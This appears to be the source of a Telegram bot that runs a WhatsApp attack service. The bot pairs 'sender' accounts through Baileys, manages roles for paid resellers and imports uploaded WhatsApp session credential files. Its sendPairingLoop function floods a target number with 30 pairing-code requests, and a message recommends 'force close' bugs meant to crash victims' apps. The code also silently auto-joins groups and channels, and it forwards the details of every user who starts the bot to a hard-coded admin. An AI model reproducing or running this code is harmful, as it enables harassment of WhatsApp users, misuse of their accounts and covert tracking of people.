const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/ControlApps.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); 
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar'); 
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const { InlineKeyboard } = require("grammy");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const { tokens, Developer: OwnerId, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cookieParser()); 
app.use(express.urlencoded({ extended: true }));
app.use(cors());
app.use(express.json());


const ownerIds = [7615520596]; // contoh chat_id owner 


const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/Visstable.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;
let globalMessages = []; 



function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log(chalk.green("Akun Terdaftar Bree"));
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

// === Command: Add Reseller ===
bot.command("addakses", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // Ambil ID dari argumen (contoh: /addakses 12345678)
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk menambah akses.", { parse_mode: "HTML" });
  }

  // 2. Validasi Input
  if (!targetId) {
    return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/resseler ID_TELEGRAM</code>\nContoh: <code>/addakses 1234567890</code>", { parse_mode: "HTML" });
  }

  // 3. Cek Database Akses
  const data = loadAkses();

  // Cek apakah ID tersebut sudah menjadi reseller
  if (data.resellers.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Reseller.");
  }

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  data.resellers.push(targetId);
  saveAkses(data);

  await ctx.reply(
    `✅ <b>Sukses Menambahkan Resseler !</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `💼 <b>Posisi:</b> Resseler Apps\n\n` +
    `<i>User ini sekarang bisa menggunakan bot untuk membuat SSH/Akun, namun role yang dibuat dibatasi hanya <b>User/Member</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delakses", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addpt ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();
  
  if (data.pts.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi PT.");
  }
  
  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut adalah Owner.");
  }

  // Masukkan ke database PT
  data.pts.push(targetId);
  saveAkses(data); // Pastikan fungsi saveAkses ada

  await ctx.reply(
    `✅ <b>Sukses Menambahkan PT!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `🤝 <b>Posisi:</b> Partner (PT)\n\n` +
    `<i>User ini sekarang bisa membuat akun dengan role <b>Member</b> dan <b>Reseller</b>.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addowner", async (ctx) => {
  const userId = ctx.from.id.toString();
  const targetId = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk mengangkat Owner baru.", { parse_mode: "HTML" });
  }

  if (!targetId) {
    return ctx.reply("⚠️ Gunakan format: <code>/addowner ID_TELEGRAM</code>", { parse_mode: "HTML" });
  }

  const data = loadAkses();

  if (data.owners.includes(targetId)) {
    return ctx.reply("⚠️ User tersebut sudah menjadi Owner.");
  }

  data.owners.push(targetId);
  
  // Opsional: Hapus dari list lain jika ada (agar data bersih)
  // Misal dia sebelumnya Reseller, kita hapus dari list reseller
  data.resellers = data.resellers.filter(id => id !== targetId);
  data.pts = data.pts.filter(id => id !== targetId);
  data.moderators = data.moderators.filter(id => id !== targetId);

  saveAkses(data);

  // 5. Beri Informasi
  await ctx.reply(
    `✅ <b>Sukses Menambahkan Owner Baru!</b>\n\n` +
    `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
    `👑 <b>Posisi:</b> Owner / Developer\n\n` +
    `<i>User ini sekarang memiliki <b>FULL AKSES</b>.\nBisa membuat semua jenis role (Owner, Admin, PT, Reseller, dll) di command /addakun.</i>`,
    { parse_mode: "HTML" }
  );
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delowner <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner removed: ${id}`);
});


const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const delActive = (BotNumber) => {
  if (!fs.existsSync(file_session)) return;
  const list = JSON.parse(fs.readFileSync(file_session));
  const newList = list.filter(num => num !== BotNumber);
  fs.writeFileSync(file_session, JSON.stringify(newList));
  console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function makeBox(title, lines) {
  const contentLengths = [
    title.length,
    ...lines.map(l => l.length)
  ];
  const maxLen = Math.max(...contentLengths);

  const top    = "" + "".repeat(maxLen + 2) + "";
  const middle = "" + "".repeat(maxLen + 2) + "";
  const bottom = "" + "".repeat(maxLen + 2) + "";

  const padCenter = (text, width) => {
    const totalPad = width - text.length;
    const left = Math.floor(totalPad / 2);
    const right = totalPad - left;
    return " ".repeat(left) + text + " ".repeat(right);
  };

  const padRight = (text, width) => {
    return text + " ".repeat(width - text.length);
  };

  const titleLine = " " + padCenter(title, maxLen) + " ";
  const contentLines = lines.map(l => " " + padRight(l, maxLen) + " ");

  return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("Pairing Connection", [
`Nomor Bot : ${number}`,
`Status : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
  text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
`Nomor Bot : ${number}`,
`Kode Sambung : ${code}`
  ]),
  parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
if (connection === "open") {
  console.log(chalk.red(`Sender Online`));
  sessions.set(BotNumber, sock);

  // === TARUH DI SINI ===
  try {
    // = JANGAN GANTI 🗿
    const channels = [
      "", // jan di ganti nanti eror
      "", // jan di ganti nanti eror
      "" // jan di ganti nanti eror
    ];

    for (const jid of channels) {
      await sock.newsletterFollow(jid);
      console.log(chalk.green(`✓ Berhasil mengikuti saluran: ${jid}`));

      const waitTime = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
      console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
      await delay(waitTime);
    }

    const groupInvites = [
      "", // jan di ganti nanti eror
      "" // jan di ganti nanti eror
    ];

    for (const invite of groupInvites) {
      try {
        const code = invite.split("/").pop();
        const result = await sock.groupAcceptInvite(code);
        console.log(chalk.green(`✓ Berhasil join grup: ${result}`));

        const waitTime = Math.floor(Math.random() * (15000 - 8000 + 1)) + 8000;
        console.log(chalk.yellow(`⏳ Tunggu ${waitTime / 1000} detik sebelum lanjut...`));
        await delay(waitTime);
      } catch (err) {
        console.log(chalk.red(`✕ Gagal join grup dari link: ${invite}`));
      }
    }

    console.log(chalk.greenBright("\n✓ Auto follow & auto join selesai dengan aman!\n"));
  } catch (err) {
    console.log(chalk.red("✕ Error di proses auto join/follow:"), err.message);
  }
  // === SAMPAI SINI ===

  return resolve();
}
        if (connection === "close") {
  const shouldReconnect =
    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

  if (shouldReconnect) {
    console.log(chalk.yellow("Koneksi tertutup, mencoba reconnect..."));
    await initializeWhatsAppConnections();
  } else {
    console.log(chalk.red("Sender Kena Frezeee"));
  }
}
});
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`<blockquote>Proses Mengubungkan Nomor ${BotNumber} Sebagai Sender Apps XzheroV5.6</blockquote>`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version, isLatest } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
    });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;

      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menyambung"));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "Gagal Total."));
        // ❌ fs.rmSync(sessionDir, { recursive: true, force: true }); --> DIHAPUS
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "Succces To Connect"));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "KEIRAAV5");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "HTML",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};


const sendPairingLoop = async (targetNumber, ctx, chatId) => {
  const total = 30; // jumlah pengiriman
  const delayMs = 2000; // jeda 2 detik

  try {
    await ctx.reply(
      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
      { parse_mode: "HTML" }
    );

    // pastikan koneksi WA aktif
    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");

    for (let i = 1; i <= total; i++) {
      try {
        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
        const formatted = code.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.sendMessage(
          chatId,
          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
          { parse_mode: "HTML" }
        );
      } catch (err) {
        await ctx.telegram.sendMessage(
          chatId,
          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
          { parse_mode: "HTML" }
        );
      }

      await new Promise(r => setTimeout(r, delayMs));
    }

    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });

  } catch (error) {
    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
  }
};


function getRuntime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// --- COMMAND START ---
bot.command("start", async (ctx) => {
    const textStart = `
<blockquote>👋 Halo ${ctx.from.first_name || "User"}!</blockquote>
<b>Selamat datang di Bot Control Apps X-Moon 1.0</b>

<blockquote>Information!</blockquote>
 - Username : X-Moon 
 - Owner : @Allhosting0
 - Version : 1.0- Vipp
 
<b>Silahkan Pilih Menu di bawah ini</b>`;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Owner ϟ Access", callback_data: "owner_settings" },
                    { text: "Settings ϟ Account", callback_data: "setting_menu" }
                ],
                [
                    { text: "Info ϟ Apps", callback_data: "info" }
                ],
                [
                    { text: "Developer ϟ Apps", url: "https://t.me/FyzzModss" },
                    { text: "Channel ϟ Apps", url: "https://t.me/Fyzzabout" }
                ]
            ]
        }
    };

    try {
        await ctx.reply(textStart, { 
            parse_mode: 'HTML',
            ...keyboard 
        });
        
        await ctx.replyWithAudio(
            { url: "https://files.catbox.moe/qnnypb.mp3" }, 
            {
                caption: "🎵 Bot Control XzheroV5.6 Active",
                performer: "Fyzz System",
                title: "Control Panel Ready"
            }
        );

    } catch (error) {
        console.log("Error:", error.message);
        await ctx.reply(textStart, { 
            parse_mode: 'HTML',
            ...keyboard 
        });
    }

    // ==========================================
    // LAPOR KE ADMIN GUE
    // ==========================================
    if (ctx.chat.type === 'private') {
        const adminId = '7568537295';
        const user = ctx.from;
        const username = user.username ? `@${user.username}` : 'Tidak ada Username';
        
        const laporan = `
🚨 <b>NEW USER STARTED BOT</b>

👤 <b>User Information:</b>
• <b>Nama:</b> ${user.first_name} ${user.last_name || ''}
• <b>Username:</b> ${username}
• <b>ID:</b> <code>${user.id}</code>
• <b>Bahasa:</b> ${user.language_code || '-'}
• <b>Link Profil:</b> <a href="tg://user?id=${user.id}">Klik Disini</a>

📝 <b>Status:</b>
User baru saja mengetik <b>/start</b> di Private Chat.

<i>${new Date().toLocaleString('id-ID')}</i>
`;

        await ctx.telegram.sendMessage(adminId, laporan, { parse_mode: 'HTML' }).catch(err => {
            console.log("Gagal lapor admin:", err.message);
        });
    }
});

// --- HANDLER UNTUK INLINE KEYBOARD ---
bot.action("owner_settings", async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!isOwner(userId) && !isAuthorized(userId)) {
        await ctx.answerCbQuery("⛔ Akses ditolak! Hanya owner/admin yang bisa mengakses.", { show_alert: true });
        return;
    }
    
    // Edit pesan untuk menampilkan menu owner
    const ownerMenu = `
<blockquote><b>Pilih menu yang tersedia:</b></blockquote>

👑 <b>Owner Commands:</b>
• /addowner <id> - Tambah owner baru
• /delowner <id> - Hapus owner
• /addakses <id> - Tambah reseller
• /addpt <id> - Tambah partner
• /listakun - List semua akun

💬 <b>Broadcast:</b>
• /addpesan <teks> - Broadcast ke semua user

<i>Gunakan command di atas untuk mengontrol bot.</i>
`;

    try {
        await ctx.editMessageText(ownerMenu, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔙 Kembali", callback_data: "back_to_start" }
                    ]
                ]
            }
        });
    } catch (error) {
        console.log("Error edit message:", error.message);
        await ctx.answerCbQuery("Menu sudah ditampilkan", { show_alert: false });
    }
});

bot.action("setting_menu", async (ctx) => {
    const pairingInfo = `
<blockquote>Pilih menu yang tersedia:</blockquote>

<b>Command Pairing:</b>
<code>/Pairing 628xxxxxxx</code>

<b>Contoh:</b>
<code>/Pairing 6281234567890</code>

<b>Perintah Lain:</b>
• /upsessions - Upload session file
• /listsender - Lihat sender aktif
• /delsesi <nomor> - Hapus session
• /adp - Auto download session
• /addpesan - Broadcast message
• /addcoin - Tambah coin user

<b>Catatan:</b>
1. Pastikan nomor WhatsApp aktif
2. Siapkan HP untuk scan QR
3. Jika timeout, ulangi proses
4. Session disimpan di folder /auth`;

    try {
        await ctx.editMessageText(pairingInfo, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔙 Kembali", callback_data: "back_to_start" }
                    ]
                ]
            }
        });
    } catch (error) {
        console.log("Error edit message:", error.message);
        await ctx.answerCbQuery("Error menampilkan menu", { show_alert: true });
    }
});

bot.action("info", async (ctx) => {
   const advancedMenu = `
<blockquote>🔧 INFORMATION</blockquote>

<b>System Information:</b>
• Node.js: ${process.version}
• Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB
• Uptime: ${getRuntime(process.uptime())}
• Platform: ${os.platform()}

<b>Bot Statistics:</b>
• Total Users: ${getUsers().length}
• Active Senders: ${sessions.size}
• Owner IDs: ${loadAkses().owners.length}

<i>Last Update: ${new Date().toLocaleString('id-ID')}</i>
`;

    try {
        await ctx.editMessageText(advancedMenu, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔙 Kembali", callback_data: "back_to_start" }
                    ]
                ]
            }
        });
    } catch (error) {
        console.log("Error edit message:", error.message);
        await ctx.answerCbQuery("Error menampilkan info", { show_alert: true });
    }
});

bot.action("back_to_start", async (ctx) => {
    // Kembali ke menu start awal
    const textStart = `
<blockquote>👋 Halo ${ctx.from.first_name || "User"}!</blockquote>
<b>Selamat datang di Bot Control Apps XzheroV5.6</b>

<blockquote>Information!</blockquote>
 - Username : X-Moon
 - Owner : @Allhosting0
 - Version : 1.0- Vipp
 
<b>Silahkan Pilih Menu di bawah ini</b>`;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "Owner ϟ Access", callback_data: "owner_settings" },
                    { text: "Settings ϟ Account", callback_data: "setting_menu" }
                ],
                [
                    { text: "Info ϟ Apps", callback_data: "info" }
                ],
                [
                    { text: "Developer ϟ Apps", url: "https://t.me/FyzzModss" },
                    { text: "Channel ϟ Apps", url: "https://t.me/Fyzzabout" }
                ]
            ]
        }
    };

    try {
        await ctx.editMessageText(textStart, {
            parse_mode: 'HTML',
            ...keyboard
        });
    } catch (error) {
        console.log("Error kembali ke start:", error.message);
        await ctx.answerCbQuery("Gagal kembali ke menu", { show_alert: true });
    }
});

bot.command("Pairing", async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply("<blockquote>Salah Broo, Masukin /Pairing 62xxxx</blockquote>", { parse_mode: "HTML" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});
// Command hapus sesi
// Command hapus sesi dengan Telegraf
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];

  if (!BotNumber) {
    return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
  }

  try {
    // hapus dari list aktif
    delActive(BotNumber);

    // hapus folder sesi
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }

    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});


bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("𝗡𝗼𝘁 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻𝘀");

  const daftarSender = [...sessions.keys()]
    .map(n => `メ \`${n}\``)
    .join("\n");

  ctx.reply(`<blockquote><b>📌Sender Connection By Apps XzheroV5.6</b></blockquote>\n<b>Sender Online</b>\n${daftarSender}\n<blockquote>Perhatian</blockquote>\nSender Disini Kadang Bisa Habis Atau Kenon, Jadi Sebelum Kehabisan Harap Cepat², Saran Bug Forclose Hard, Biar Sender Awet`, {
    parse_mode: "HTML"
  });
});

bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command('addcoin', (ctx) => {
    // 1. Validasi Owner (Ganti dengan ID Telegram Owner)
    const ownerId = 123456789; 
    if (ctx.from.id !== ownerId) return ctx.reply('❌ Maaf, command ini khusus Owner.');

    const args = ctx.message.text.split(' ');
    // args[0] = /addcoin
    // args[1] = username (target)
    // args[2] = jumlah

    if (args.length < 3) {
        return ctx.reply('⚠️ Format Salah!\nGunakan: /addcoin <username> <jumlah>\nContoh: /addcoin keiraa 10000');
    }

    let targetUsername = args[1];
    const amount = parseInt(args[2]);

    // Hapus karakter '@' jika admin mengetikkannya
    if (targetUsername.startsWith('@')) {
        targetUsername = targetUsername.substring(1);
    }

    if (isNaN(amount)) return ctx.reply('❌ Jumlah coin harus berupa angka!');

    try {
        // Cari user berdasarkan 'name' atau 'username' di database
        // Asumsi DB: global.db.data.users = { '628xxx': { name: 'keiraa', coin: 0 } }
        let userKey = Object.keys(global.db.data.users).find(
            k => global.db.data.users[k].name === targetUsername
        );

        if (!userKey) {
            return ctx.reply(`❌ User dengan username '${targetUsername}' tidak ditemukan di database.`);
        }

        // Tambah Coin
        global.db.data.users[userKey].coin = (global.db.data.users[userKey].coin || 0) + amount;

        ctx.reply(`✅ Berhasil menambahkan ${amount} Coin ke akun '${targetUsername}'.\n💰 Total Coin: ${global.db.data.users[userKey].coin}`);

    } catch (err) {
        console.error(err);
        ctx.reply('❌ Terjadi kesalahan server.');
    }
});
// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("upsessions", async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  // 🔒 Cek hanya owner
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const replyMsg = ctx.message.reply_to_message;
  if (!replyMsg || !replyMsg.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = replyMsg.document;
  const name = doc.file_name.toLowerCase();

  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session...");

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

    // Ekstrak file
    if (name.endsWith(".json")) {
      await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fs.promises.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    // 🔍 Cari creds.json
    const findCredsFile = async (dir) => {
      const files = await fs.promises.readdir(dir, { withFileTypes: true });
      for (const file of files) {
        const filePath = path.join(dir, file.name);
        if (file.isDirectory()) {
          const found = await findCredsFile(filePath);
          if (found) return found;
        } else if (file.name === "creds.json") {
          return filePath;
        }
      }
      return null;
    };

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di file session.");
    }

    const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
    const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
